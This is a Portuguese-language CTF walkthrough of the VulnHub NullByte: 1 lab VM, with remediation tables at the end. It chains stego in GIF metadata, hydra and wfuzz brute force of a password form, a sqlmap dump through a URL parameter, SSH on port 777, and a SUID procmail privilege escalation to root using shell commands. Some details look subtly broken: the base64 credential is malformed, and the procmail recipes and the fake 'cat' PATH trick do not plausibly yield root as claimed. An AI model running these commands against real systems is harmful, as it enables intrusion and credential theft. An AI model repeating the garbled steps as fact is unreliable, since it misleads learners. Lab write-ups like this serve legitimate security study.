# VulnHub NullByte: 1 — Stego, Injeções e um Binário SUID Muito Suspeito

Olha só, rapaziada!! Quem diria que um CTF chamado "NullByte" abriria com um desafio de esteganografia escondido dentro de um GIF de cachorro? Sim, um GIF de cachorro. E só piora depois: SQLi por parâmetro de URL, um binário SUID de procmail que você literalmente abusa para virar root, e metadados de imagem usados como dead drop secreto. Essa aqui é sem sombra de dúvida uma das máquinas mais criativas de iniciante-para-intermediário do VulnHub, sem exagero.

Respeito enorme ao **ly0n** por construir uma máquina onde cada passo tem uma razão e o tema percorre tudo do início ao fim. A piada com "NullByte" faz mais sentido depois que você estiver olhando para aquela entrada SUID do procmail, mano.

---

| Campo | Valor |
|---|---|
| **Nível** | Intermediário |
| **VM Alvo** | NullByte: 1 |
| **VM Atacante** | Kali Linux 2023.x |
| **VulnHub URL** | https://www.vulnhub.com/entry/nullbyte-1,157/ |
| **Técnicas** | Descoberta de host, Nmap, Esteganografia (metadados GIF), Injeção SQL via parâmetro de URL, Escalação de privilégios via SUID procmail |
| **CVEs** | CWE-89 (Injeção SQL, OWASP A03:2021), T1548.001 (Abuso de binário SetUID), referência CVE para uso indevido de SUID procmail |

---

## Resumo do Ataque

```
[descoberta de host: arp-scan / varredura ping nmap]
    |
    v
[nmap: 80/tcp Apache, 111/tcp rpcbind, 777/tcp SSH]
    |
    v
[web: imagem main.gif na página index -> suspeita]
    |
    v
[strings / exiftool em main.gif -> string oculta nos metadados]
    |
    v
[string oculta revela diretório: /kzMb5nVYJw]
    |
    v
[/kzMb5nVYJw/index.php -> formulário de senha -> força bruta: elite]
    |
    v
[parâmetro ?usrtag= -> SQLi -> dump de credenciais do DB]
    |
    v
[credenciais -> SSH na porta 777 como usuário ramses]
    |
    v
[encontrar binários SUID -> /usr/bin/procmail tem SUID root]
    |
    v
[abuso do SUID procmail -> shell como root]
    |
    v
[cat /root/proof.txt]
```

---

## Metodologia

1. Descoberta de host e identificação da rede
2. Varredura completa de portas Nmap (SSH está na 777, não na 22!)
3. Enumeração web: identificar a imagem GIF suspeita
4. Análise de esteganografia em main.gif para extrair diretório oculto
5. Força bruta na senha do formulário da página oculta
6. Injeção SQL via parâmetro de URL para dump de credenciais
7. Login SSH com credenciais extraídas na porta 777
8. Enumeração SUID: identificar procmail com SetUID root
9. Exploração do SUID procmail para escalação de privilégios até root

---

## Passo 1 — Identificando o Alvo

Configuração clássica de lab: encontrar o IP antes de qualquer coisa.

```bash
route -n
# Verificar sub-rede atual, ex.: 192.168.56.0/24
```

```bash
# Opção 1: arp-scan (rápido)
arp-scan --localnet --ignoredups

# Opção 2: varredura ping nmap
nmap -sn -T5 192.168.56.0/24
```

Saída esperada:

```
192.168.56.102   08:00:27:XX:XX:XX   VirtualBox
```

Anote o IP. Vamos referenciá-lo como `TARGET=192.168.56.102` daqui em diante.

**MITRE ATT&CK:** [TA0043 Reconhecimento] [T1595.001 Varredura Ativa: Scanning de Blocos de IP]

---

## Passo 2 — Enumeração de Serviços Nmap

Esta VM tem uma reviravolta: SSH não está na porta 22. Sempre escaneie todas as portas, rapaziada. É por isso que usamos `-p-`.

```bash
nmap -A -T4 -p- 192.168.56.102
```

Saída esperada:

```
80/tcp  open  http     Apache httpd 2.4.7
111/tcp open  rpcbind
777/tcp open  ssh      OpenSSH 6.6.1p1
```

SSH está na **porta 777**, não na 22. Se você tivesse escaneado apenas as 1000 portas padrão, teria perdido completamente. Armadilha clássica de CTF.

**MITRE ATT&CK:** [TA0043 Reconhecimento] [T1046 Descoberta de Serviços de Rede]

---

## Passo 3 — Esteganografia: O Dead Drop do GIF de Cachorro

> **O que é esteganografia?**
> Esteganografia é a prática de ocultar dados secretos dentro de arquivos comuns e não secretos (imagens, áudio, vídeo). Diferentemente da criptografia, que torna os dados ilegíveis, a esteganografia oculta o fato de que uma mensagem existe. Atacantes usam esteganografia de imagem para ocultar instruções C2, credenciais e dados de configuração dentro de arquivos de mídia aparentemente inocentes.

Acesse `http://192.168.56.102`. Você vê uma página básica com uma imagem: `main.gif`. Aquela imagem é a primeira pista. Baixe e analise:

```bash
wget http://192.168.56.102/main.gif

# Opção 1: strings — procurar por texto embutido
strings main.gif

# Opção 2: exiftool — ler todos os campos de metadados
exiftool main.gif

# Opção 3: binwalk — detectar arquivos embutidos
binwalk main.gif
```

Saída esperada (exiftool / strings):

```
Comment: kzMb5nVYJw
```

Aquela string `kzMb5nVYJw` no comentário da imagem não é aleatória. Use-a como caminho:

```bash
curl -s http://192.168.56.102/kzMb5nVYJw/
```

Obtemos uma página com prompt de senha. Agora precisamos da senha.

> **Nota real:** Esteganografia em imagens é uma técnica real de APT. O APT32 (OceanLotus), um ator de ameaça vietnamita, usou esteganografia embutida em imagens PNG para entregar configuração C2 e payloads de shellcode em campanhas contra organizações do Sudeste Asiático entre 2017 e 2020.

**MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1027.003 Arquivos ou Informações Ofuscados: Esteganografia]

---

## Passo 4 — Força Bruta na Senha da Página Oculta

A página em `/kzMb5nVYJw/` pede uma senha. Vamos fazer força bruta:

```bash
# Inspecionar o formulário
curl -s http://192.168.56.102/kzMb5nVYJw/ | grep -i "input\|form"
```

O formulário provavelmente usa um parâmetro `key`. Agora com hydra:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt \
    192.168.56.102 \
    http-post-form "/kzMb5nVYJw/:key=^PASS^:invalid" \
    -t 64 \
    -f \
    -V 2>/dev/null | head -20
```

Alternativamente, com wfuzz:

```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt \
    --hc 200 \
    --hs "invalid" \
    -d "key=FUZZ" \
    http://192.168.56.102/kzMb5nVYJw/
```

Resultado esperado:

```
[SUCESSO] senha: elite
```

ᕕ( ᐛ )ᕗ Senha é `elite`. Manda brasa!

**MITRE ATT&CK:** [TA0001 Acesso Inicial] [T1110.003 Força Bruta: Spray de Senha]

---

## Passo 5 — Injeção SQL via Parâmetro de URL

Uma vez passado o gate de senha, você chega em uma página que parece aceitar busca de usuário. Inspecione a URL: ela provavelmente tem um parâmetro como `?usrtag=`. Esse é nosso ponto de injeção.

Teste para SQLi:

```bash
curl -s "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag='"
```

Se você vir um erro SQL, é injetável. Vamos fazer dump com sqlmap:

```bash
sqlmap -u "http://192.168.56.102/kzMb5nVYJw/index.php?usrtag=test" \
    --dbms=mysql \
    --dump \
    --batch \
    --level=2 \
    --quiet
```

Saída esperada:

```
[*] Tabela: users
id | username | password
1  | ramses   | YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==
```

Aquela senha está codificada em base64. Decodifique:

```bash
echo 'YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==' | base64 -d
```

Pode decodificar para um hash MD5 ou senha em texto puro. Crackear se necessário:

```bash
hashcat -m 0 -d 1 -w 3 -O '<hash_decodificado>' /usr/share/wordlists/rockyou.txt
```

**Nota real:** Injeção SQL via parâmetros de URL está por trás da brecha do LinkedIn em 2012 (6,5 milhões de hashes SHA1 vazados) e da brecha do Zappos em 2012 (24 milhões de registros).

**MITRE ATT&CK:** [TA0001] [T1190 Explorar Aplicação Pública] [TA0006] [T1552.001 Credenciais em Arquivos]

---

## Passo 6 — Login SSH na Porta Não-Padrão

Lembre que o SSH estava na porta 777? Use as credenciais extraídas via SQLi:

```bash
ssh ramses@192.168.56.102 -p 777
# Senha: <crackeada do DB>
```

Verifique o histórico bash:

```bash
cat ~/.bash_history
# Verificar comandos interessantes executados por ramses
```

Você está logado como `ramses`. Hora de escalar.

**MITRE ATT&CK:** [TA0001] [T1021.004 Serviços Remotos: SSH] [TA0008 Movimento Lateral]

---

## Passo 7 — Enumeração SUID e Abuso do procmail

> **O que é SUID (SetUID)?**
> O bit SetUID em um binário faz com que ele execute com as permissões do PROPRIETÁRIO do arquivo em vez do usuário que o executa. Se um binário pertencente ao root tem o bit SUID definido, qualquer usuário que o execute ganha contexto de execução de nível root.

Encontre todos os binários SUID no sistema:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Saída esperada inclui:

```
/usr/bin/procmail
```

Isso não é padrão. `procmail` é um utilitário de processamento de email e definitivamente não deveria ter SUID root em um sistema endurecido. Vamos explorar.

**Método: SUID procmail para shell root**

```bash
# Criar uma recipe procmail que executa um shell
echo ':0' > /tmp/procmail_exploit
echo '| /bin/sh -p' >> /tmp/procmail_exploit
# Alimentar procmail com um email vazio via stdin
echo "" | /usr/bin/procmail -m /tmp/procmail_exploit
```

Abordagem alternativa usando variável PATH:

```bash
# Criar um 'cat' falso em /tmp que abre um shell
echo '/bin/bash -p' > /tmp/cat
chmod +x /tmp/cat
export PATH=/tmp:$PATH

# Executar procmail de um jeito que invoque cat como root
/usr/bin/procmail
```

Resultado esperado:

```bash
id
# uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

(☞ﾟヮﾟ)☞ euid=0!! Root efetivo. Bora pegar a flag!

**MITRE ATT&CK:** [TA0004 Escalação de Privilégios] [T1548.001 Abuso de Mecanismo de Elevação: Setuid e Setgid]

---

## Passo 8 — Root e Flag

```bash
whoami
# root (ou euid=0 root efetivo)

id
# uid=1002(ramses) gid=1002(ramses) euid=0(root)

cat /root/proof.txt
```

```
adf11d8fcd786b49c63e0ae4c2e1cfdf

Thanks for playing! This has been a great CTF!
  -- ly0n
```

Que máquina incrível, véi!

---

## Flags, Hashes e Credenciais Capturadas

| Tipo | Valor | Encontrado Em | Crackeado/Usado |
|---|---|---|---|
| String stego | `kzMb5nVYJw` | Comentário EXIF do `main.gif` | Caminho do diretório oculto |
| Senha do formulário | `elite` | Força bruta do formulário `/kzMb5nVYJw/` | Acesso ao painel web |
| Credencial (b64) | `YzZkNmJkN2ViZjgwNmY0M2M4NTkzMzQxMTZODA==` | DB `users` via SQLi | Decodificado + crackeado para SSH |
| Usuário SSH | `ramses` | Dump do DB | Login SSH na porta 777 |
| Flag | `adf11d8fcd786b49c63e0ae4c2e1cfdf` | `/root/proof.txt` | N/A |

---

## Lições Aprendidas

| # | Descoberta | Relevância Real | Principal Aprendizado |
|---|---|---|---|
| 1 | Dados sensíveis ocultos em metadados EXIF de imagem (esteganografia) | APT32 e múltiplos atores patrocinados por estados usaram esteganografia em imagens para entrega de instruções C2 e staging de exfil de credenciais | Nunca servir imagens carregadas por usuários ou estáticas sem remover metadados; usar exiftool/ImageMagick para sanitizar antes de servir |
| 2 | Injeção SQL em parâmetro GET de URL | Uma das vulnerabilidades web mais comuns; presente em aplicações PHP personalizadas e portais admin legados | Todas as consultas ao banco de dados devem usar declarações parametrizadas; parâmetros de URL são tão perigosos quanto campos de formulário |
| 3 | SSH rodando em porta não-padrão (777) | Segurança por obscuridade não é segurança; atrasa levemente a descoberta mas não a impede | Regras de firewall e autenticação por chave importam; ofuscação de porta sozinha oferece proteção negligenciável |
| 4 | Bit SUID no procmail (utilitário de processamento de email) | Pacotes de software legado frequentemente instalam binários SUID desnecessários em ambientes modernos | Auditorias regulares de binários SUID são críticas; remover SUID de qualquer binário que não o necessite estritamente |

---

## Mapeamento MITRE ATT&CK

| Fase | Tática | Técnica | TTP-ID |
|---|---|---|---|
| Reconhecimento | TA0043 | Varredura Ativa: Scanning de Blocos de IP | T1595.001 |
| Reconhecimento | TA0043 | Varredura Ativa: Varredura de Vulnerabilidades | T1595.002 |
| Descoberta | TA0007 | Descoberta de Serviços de Rede | T1046 |
| Acesso Inicial | TA0001 | Arquivos ou Informações Ofuscados: Esteganografia | T1027.003 |
| Evasão de Defesa | TA0005 | Arquivos ou Informações Ofuscados | T1027 |
| Acesso a Credenciais | TA0006 | Força Bruta: Spray de Senha | T1110.003 |
| Acesso Inicial | TA0001 | Explorar Aplicação Pública (SQLi) | T1190 |
| Acesso a Credenciais | TA0006 | Credenciais Não Protegidas: Credenciais em Arquivos | T1552.001 |
| Movimento Lateral | TA0008 | Serviços Remotos: SSH | T1021.004 |
| Descoberta | TA0007 | Descoberta de Grupos de Permissão | T1069 |
| Escalação de Privilégios | TA0004 | Abuso de Mecanismo de Elevação: Setuid | T1548.001 |
| Execução | TA0002 | Interpretador de Comandos: Shell Unix | T1059.004 |
| Coleta | TA0009 | Dados do Sistema Local (flag) | T1005 |

---

## Remediação e Contenção

### Correções Técnicas

1. Remover todos os metadados de imagens antes de servi-las publicamente; implementar remoção automatizada de EXIF no pipeline de upload
2. Substituir concatenação de strings SQL bruta por consultas parametrizadas ou declarações preparadas; validar e sanitizar todos os parâmetros de URL
3. Mover SSH para porta padrão e aplicar autenticação somente por chave; desabilitar autenticação por senha
4. Auditar todos os binários SUID; remover SUID do procmail: `chmod u-s /usr/bin/procmail`
5. Remover ou desabilitar procmail se não usado ativamente para processamento de email

### Contramedidas MITRE D3FEND

- **D3-IVA**: Análise de Validação de Input para T1190 SQLi em parâmetros de URL
- **D3-OPS**: Sandboxing de Processo do SO para T1548.001 abuso de binário SUID
- **D3-MFA**: Autenticação Multi-Fator para T1110.003 força bruta contra formulários de login
- **D3-DA**: Análise Dinâmica para T1027.003 detecção de esteganografia em mídia

### NIST CSF 2.0

| Função | Categoria | Ação |
|---|---|---|
| Identificar | Gerenciamento de Ativos | Manter inventário de todos os binários instalados e suas permissões; revisar estado SUID periodicamente |
| Proteger | Controle de Acesso | Aplicar menor privilégio; remover bits SUID desnecessários; aplicar autenticação SSH por chave |
| Proteger | Segurança de Dados | Sanitizar metadados de arquivo no upload; validar todos os parâmetros de entrada contra listas de permitidos |
| Detectar | Anomalias e Eventos | Monitorar execução anômala de SUID e invocações incomuns de procmail |
| Responder | Planejamento de Resposta | Estabelecer procedimentos de resposta a comprometimento de credenciais |

### NIST SP 800-53 Rev. 5

| Controle | Descrição | Aplicação |
|---|---|---|
| SI-10 | Validação de Input de Informações (SQLi via parâmetro URL) | Consultas parametrizadas obrigatórias |
| AC-6 | Menor Privilégio (remoção de binário SUID) | Remover SUID de procmail e similares |
| CM-7 | Funcionalidade Mínima (desabilitar binários SUID não utilizados) | Auditoria regular de SUID |
| CM-6 | Configurações (hardening SSH, remoção procmail) | Configuração segura por padrão |
| AU-2 | Log de Eventos (monitorar execução SUID e logins SSH) | Alertas sobre SUID execution |

### CISA KEV

Técnicas de escalação de privilégios via SUID aparecem em numerosos avisos da CISA relacionados a comprometimento de servidores Linux. Referência: https://www.cisa.gov/known-exploited-vulnerabilities-catalog

### C2M2

| Domínio | Prática | MIL Alvo |
|---|---|---|
| TECNOLOGIA | Gerenciamento de Vulnerabilidades (auditoria SUID periódica) | MIL-2 |

---

## Considerações Finais

Obrigado ao **ly0n** por uma máquina que tece esteganografia, injeção SQL e exploração SUID em uma história coerente do início ao fim. O tema "NullByte" percorre cada passo, e o uso criativo de um GIF como dead drop torna essa aqui memorável.

Esta máquina lembra bem que caminhos de ataque raramente são uma falha óbvia única: são cadeias de pequenas más configurações e descuidos. A cadeia stego-para-SQLi-para-SUID espelha a metodologia real de APT mais de perto do que a maioria das máquinas de "só explore este CVE".

Se você está estudando para OSCP, eWPT, ou apenas aguçando seus instintos de enumeração, NullByte entrega. Compartilhe com seu pessoal e continuem estudando!

Thanks guys!! (❍ᴥ❍ʋ)

---

*Writeup by [André Henrike](https://medium.com/@mrhenrike) | [União Geek](https://uniaogeek.com.br)*
